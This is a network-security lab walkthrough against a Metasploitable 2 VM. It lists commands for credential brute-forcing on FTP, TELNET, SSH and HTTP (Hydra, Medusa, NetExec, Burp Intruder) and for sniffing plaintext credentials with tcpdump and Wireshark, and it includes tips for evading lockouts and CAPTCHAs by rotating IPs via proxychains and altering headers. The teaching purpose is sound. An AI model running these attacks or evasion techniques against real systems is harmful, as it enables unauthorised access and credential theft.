# Network Protocol Security Lab Walkthrough

## 1. Lab Setup
### Objective
The goal of this lab is to explore vulnerabilities in common network protocols (FTP, TELNET, SSH, HTTP) by performing brute force attacks, sniffing network traffic, and analyzing security weaknesses. Additionally, mitigation strategies will be proposed to improve security.

### Environment
- **Kali Linux** (Attacker Machine)
- **Metasploitable 2** (Target VM)
- **Tools Used:**
  - Hydra, Medusa, NetExec (Brute Force Attacks)
  - Burp Suite (HTTP Login Brute Force)
  - Wireshark, tcpdump (Traffic Sniffing)
  - Nmap, Enum4Linux (Enumeration)

## 2. Enumeration
### Scanning the Target Machine
First, identify open ports and services running on the target VM:
```bash
nmap -p 21,23,22,80 --script=ftp-anon,telnet-encryption,ssh-hostkey <TARGET_IP>
```
![alt text](image.png)

### Enumerating Usernames
For FTP, TELNET, and SSH:
```bash
enum4linux -a <TARGET_IP>
```
For HTTP:
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```
*Document any discovered usernames.*

## 3. Brute Force Attacks
### 3.1 FTP Brute Force Attack (Hydra)
```bash
hydra -L userlist.txt -P passlist.txt <TARGET_IP> ftp -V
```
*Successful login screenshot here.*

### 3.2 TELNET Brute Force Attack (Medusa)
```bash
medusa -h <TARGET_IP> -U userlist.txt -P passlist.txt -M telnet
```
*Successful login screenshot here.*

### 3.3 SSH Brute Force Attack (NetExec)
```bash
nxc <TARGET_IP> -u userlist.txt -p passlist.txt -m ssh
```
*Successful login screenshot here.*

### 3.4 HTTP Login Brute Force Attack (Burp Suite)
1. Capture login request using Burp Suite Proxy.
2. Send it to **Intruder** and set attack type to **Cluster Bomb**.
3. Load username and password lists.
4. Start attack and analyze responses for successful logins.

*Provide screenshot of a successful login attempt.*

## 4. Sniffing Network Traffic
### Capturing Packets using Wireshark
1. Open Wireshark:
```bash
sudo wireshark
```
2. Start capture on the network interface connected to the target.
3. Apply filters:
   - FTP: `tcp.port == 21`
   - TELNET: `tcp.port == 23`
   - SSH: `tcp.port == 22`
   - HTTP: `tcp.port == 80`
4. Identify unencrypted traffic containing credentials.

### Capturing Packets using tcpdump
```bash
sudo tcpdump -i eth0 port 21 or port 23 or port 22 or port 80 -w capture.pcap
```
Analyze `capture.pcap` in Wireshark.

*Provide screenshot of captured plaintext credentials.*

## 5. Problems Encountered
- **Rate Limiting / Account Lockouts:** Some services limit failed attempts.
  - **Solution:** Use slow attack mode (`-t 1` in Hydra) or rotate IPs via proxychains.
- **CAPTCHA / Anti-Brute Force Mechanisms:** Some login forms block automated requests.
  - **Solution:** Modify request headers or use manual testing techniques.

## 6. Mitigation Strategies
| Protocol  | Vulnerability | Secure Alternative |
|-----------|--------------|--------------------|
| FTP       | Plaintext credentials | Use SFTP or FTPS |
| TELNET    | Unencrypted traffic  | Use SSH instead  |
| SSH       | Password brute force | Use SSH keys and 2FA |
| HTTP      | Unsecured login forms | Use HTTPS and implement rate-limiting |

## 7. Conclusion
- Brute force attacks were successfully performed against FTP, TELNET, SSH, and HTTP.
- Unencrypted credentials were captured from FTP and TELNET.
- Mitigation strategies, such as enforcing encryption and key-based authentication, improve security.
